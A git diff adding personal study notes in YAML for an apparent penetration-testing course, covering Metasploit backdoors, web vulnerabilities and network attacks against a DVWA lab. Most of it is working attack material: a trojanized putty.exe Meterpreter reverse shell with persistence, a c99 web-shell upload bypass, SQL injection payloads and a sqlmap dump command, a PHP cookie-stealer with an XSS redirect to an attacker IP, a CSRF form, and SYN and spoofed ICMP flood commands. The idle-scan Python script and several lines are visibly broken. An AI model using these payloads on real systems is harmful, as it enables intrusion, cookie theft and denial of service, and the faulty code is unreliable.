@@ -321,28 +321,330 @@ udemy:
             term -> execute exploit
               sessions -i # check if you have sessions
       - name: 14_backdoor_10
-    section_6_vuln_web:
+        meterpreter:
+          desc: extension of metasploit, use as payload, shell meterpreter, persistance module (metsvc)
+          cmd: 
+            wget https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+            msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.106 lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe
+            file hello.exe
+            msfconsole
+            use exploit/multi/handler
+            set payload windows/meterpreter/reverse_tcp
+            set lhost 192.168.1.106
+            set lport 3232
+            exploit
+            # on attacked machine launch hello.exe
+            # on attack machine you have a shell
+            ifconfig
+            help
+            screenshot
+            # cool but if you close you lose connection
+            # go persist
+            run metsvc
+        cymothoa:
+          desc: inject code in process
+        intersect:
+          desc: post-exploit, get pwd file, SSH key, network info, scan secu soft
+    section_6_vuln_web_105:
       - name: 15_intro_9
+        OWASP: Open Web Application Security Project, make classment
+        ZAP: OWASP Zed Attack Proxy
       - name: 16_site_carto_16
+        desc:
+          cartographie: get sitemap
+          dynamic_site: footprint more than sitemap
+        vega:
+          desc: 
+            * open source platform to test web appli,
+            * test SQL injection, XSS, info dealing,
+            cmd:
+              vega
+              scan -> start new scan 
+                -> enter a base URI for scan
+                -> www.kondah.com
+                -> finish
+              following redirection -> like to add to the scope -> yes
+              all problem reveale are false positive, need to be test
+        burp_suite:
+          desc:
+            * secu test on web appli
+            * analyse, edit and replay request 
+          cmd: 
+            burpsuite
+            # seems so better
       - name: 17_vuln_php_12
+        desc:
+          dvwa: platform to test vuln
+          include:
+            desc: 
+              <php include('config.php'); ?>
+              is use very often
+              2 way to exploit
+                local: LFI (Locale File Include)
+                remote: RFI (Remote File Include)
+              when include in in url, you can change path
+              google.com?page=config.php
+              google.com?page=/etc/passwd
+            protect:
+              file_exist('name'); // check if file existe
+              config .htacess // whitelist/blacklist file permit to include
+          upload:
+            still present
+            permit backdoor
+            exploit:
+              double extension
+              bypass mime verif
+              destination repertory selection
+            exemple:
+              dvwa -> upload -> choose c99.php file
+              burpsuite -> proxy -> intercept
+              dvwa -> upload -> get request -> `Content-Type: "image/jpeg"`
+            protect:
+              * when upload -> rename with random name without extension
+              * forbide special char (<>?&;) but be carreful with other encodage equivalent
+              * forbid script exection
+              * htacess
       - name: 18_sql_injection_20
+        pwd: ' 1=1-- #'
+        scenari:
+          detection:
+            mydomain.com/products/product.asp?productId=1
+          injection:
+            mydomain.com/products/product.asp?productId=123 UNION SELECT username, password FROM USERS
+          result request:
+            SELECT ProductName, ProductDescription FROM Products WHERE ProductId='123' UNION SELECT Username, Password FROM Users;
+        tools:
+          sqlmap:
+            cmd:
+              sqlmap -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=NULL&Submit=Submit#" --coockie="PHPSESSID=fc61cdb4d87a06e3310031367c3c5267; security=low" --dump
+              other tools ? Y
+              crack via dictio ? Y
+          OWASP Zed Attack Proxy: ~
+          Hash-identifier:
+            cmd:
+              hash-identifier
+              # copy hash from dvwa
+              # give the more probable crypto
+              google -> md5cracker
+        exemple:
+          DVWA -> sql injection
+          1'
+          1' 1=1 UNION SELECT null,version() #
+          1' 1=1 UNION SELECT null,table_name FROM INFORMATION_SCHEMA.tables #
+          1' 1=1 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='users'#
+          1' 1=1 UNION SELECT null,concat(user,0x0a,password) FROM users#
+          get pwd hash -> enjoy
+        protect:
+          - do not use interpretor
+          - encode data before use interpretor
+          - validate type with "white list"
+          - minimize database right
       - name: 19_xss_cross_site_scripting_34
+        javascript:alert(document.coockie);
+        script:
+          CS.php: >
+            <?php
+              $file = "coockies.txt"
+              if(isset($_GET['cookie'])) {
+                $handle = fopen($file, "a");
+                fwrite($handle, $_GET['cookie']."\r\n");
+                fclose($handle);
+                echo "Ligne ajoutee<br/>";
+              }
+
+              $handle = fopen($file, "r");
+              while($data = fgets($handle)) {
+                echo $data."<br/>";
+              }
+              fclose($handle);
+              ?>
+            exemple2:
+              DVWA -> XSS reflected
+              hamza
+              <script>alert('xss')</script>
+              <script>location.replace("http://192.168.1.106/CS.php?coockie=" + document.coockie)</script>
+          xss.php:
+            <html>
+            <?php $name = $_REQUEST['name']; ?>
+            <html><body>Hello, <?php echo $name; ?>!</body></html>
+            exemple:
+              xsser
+              xsser --gtk
+              XSSer -> Intruder -> http://192.168.1.106/xss.php?name=hamza
+                -> stat -> verbose -> fly !
+        tools:
+          BeEf:
+            cmd:
+              beef-xss
+          XSSer: ~
+          OWASP Zed Attack Proxy (ZAP): ~
+            cmd:
+              zaproxy
+              persist zap session ? No
+              Speed beginning -> Configure your browser -> Plug-n-Hack
+              bowser -> preference -> advanced -> setting
+                -> automatic proxy configure URL -> check
+              zap -> historic -> RMB on a request -> attack -> balayage 
+                -> alert
+          Mano military: ~
+        protect:
+          htmlspecialchars()
+          htmlentities()
+          strip_tags()
+          don t print what user give you
       - name: 20_csrf_cross_site_request_forgery_11
-    section_7_vuln_reseau:
+        auto_cred:
+          - session coockie
+          - HTTP header
+          - IP adress
+          - SSL certs
+          - windos domaine auth
+        todo:
+          DVWA -> CSRF
+          # you can view src 
+          # you can see parameter in url
+          ctrl+U -> copy form source code
+          create csrf.html -> paste code
+          in pwd_cur, pwd_new and pwd_conf add value (alphorm, hamza, hamza)
+          change <form> attribut -> action="192.168.1.106/dcwa/vulnerabilities/csrf/?"
+        protect:
+          - add a token, not auto sent, to all  sensible request
+          - token must be crypto sure
+          - stock a token and add it to all form and link 
+    section_7_vuln_reseau_66:
       - name: 21_intro_4
+        reseau sans fils plus vulnerable que filaire
+        3 pilliers de la securite info:
+          - analyser, detecter, verifier et coriger
+          - traiter les problemes de vulnerabilites, la gestion des corectifs et audit
+          - resoudre les problemes le plus rapidement et efficacement possible
+        network auditing
+          + patch management
+          + vulnerability scanning
+          = reports
       - name: 22_Idle_host_scanning_17
+        desc: old but still in use, port scan, but with an other indentity
+        script: >
+          #!/usr/bin/python
+          # idle_scan.py
+          import os
+          import sys
+          from scapy.all import *
+
+          def is_root():
+            return os.getuid() == 0
+
+          def run_scan(zombie, target, port):
+            print '[*] Scan %s port %d using %s as zombie' % (target, port, zombie)
+            # get zombie's IP id with a SYN/ACK
+            p1 = sr1(IP(dst=zombie)/TCP(sport=12345,dport=(123),flag="SA"),verbose=0)
+            initial_id = p1.id
+
+            print('[+] Zombie initial IP id', initial_id)
+
+            # SYN to target with spoofed IP from zombie
+            p2 = send(IP(dst=zombie)/TCP(sport=12345,dport=(port),flags="S"),verbose=0)
+
+            # SYN to target with spoofed IP with zombie
+            p3 = sr1(IP(dst=zombie)/TCP(sport=1234,dport=(123),flag="SA"),verbose=0)
+            final_id = p3.id
+
+            print('[+] Zombie final IP id', final_id)
+
+            if final_id - initial_id < 2:
+              print('[+] Port %d : closed' % port)
+            else:
+              print('[+] Port %d : open' % port)
+
+          if __name__ = '__main__':
+            print
+            if not is_root():
+              print('[!] Must be run as root. Qutting')
+              sys.exit(1)
+
+            if len(sys.argv) < 4 or sys.argc[1] = '-h':
+              print('Usage: idle_scan.py zombieIP targetIP targetPort')
+              sys.exit(1)
+
+            run_scan(sys.argv[1], sys.argv[2], int(sys.argv[3]))
+        tools:
+          nmap: ~
+          hping3: ~
+          scapy:
+            desc: manipulation and injection of packet in network
+        lab:
+          hping3 192.168.1.106 -1
+          scapy
+          i = IP()
+          i.display()
+          i.dst = "192.168.1.108"
+          i.display()
+          u = UDP()
+          u.display()
+          u.dport
+          u.dport = 123
+          requete = (i/u)
+          requete.display()
+          reponse = sr1(requete)
+          reponse.display()
+          response = sr1(IP(dst="192.168.1.106")/UDP(dport=53),timeout=1,verbose=1)
+          response.display()
+          ./idle_scan.py 192.168.1.106 192.168.1.107 80
+          nmap 192.168.1.107 -p 80
+          ./idle_scan.py 192.168.1.106 192.168.1.107 445
+          nmap 192.168.1.107 -p 445
+          ./idle_scan.py 192.168.1.106 192.168.1.107 90
+          nmap 192.168.1.107 -p 90
+          nmap -sI 192.168.1.106 192.168.1.107 -p 80
       - name: 23_service_deny_8
+        concept: 
+          DOS: resultat d un remplissage d une zone de stockage ou un canal de com jusqu a ce que l on ne puisse plus l utiliser
+          Deny of service by smurf:
+            desc:
+              - attack server ping broadcast server
+              - broadcast server pin network
+              - all machine in the network answer to broadcast server
+              - all machine in the network answer to target server
+          Deny of service by SYN flood:
+            lab:
+              with_msf:
+                msfconsole
+                use auxiliary/dos/tcp/synflood
+                show options
+                set RHOST 192.168.1.106
+                exploit
+              with_scapy:
+                scapy
+                i = IP()
+                i.display()
+                i.dst = '192.168.1.106'
+                i.display()
+                ping = ICMP()
+                ping.display()
+                requete = (i/ping)
+                send(requete)
+                look_with_wireshark:
+                  wireshark
+                    -> eth0 -> start
+                    filter -> ICMP
+                scapy
+                send(IP(dst="192.168.1.106",src="192.168.1.107")/ICMP(),count=100,verbose=1)
+                send(IP(dst="192.168.1.106",src="192.168.1.107")/ICMP(),count=1000,verbose=1)
+
+        tools:
+          scapy
+          metasploit
       - name: 24_network_sniffing_11
       - name: 25_network_spoofing_10
       - name: 26_man_in_the_middle_13
-    section_8_vuln_app:
+    section_8_vuln_app_44:
       - name: 27_intro_8
       - name: 28_buffer_overflow_18
       - name: 29_integer_overflow_1
       - name: 30_format_string_8
       - name: 31_shellcode_intro_3
       - name: 32_secu_4
-    section_9_contre_mesure:
+    section_9_contre_mesure_11:
       - name: 33_general_counter_11
-    section_10_final:
+    section_10_final_8:
       - name: 34_conclusion_8
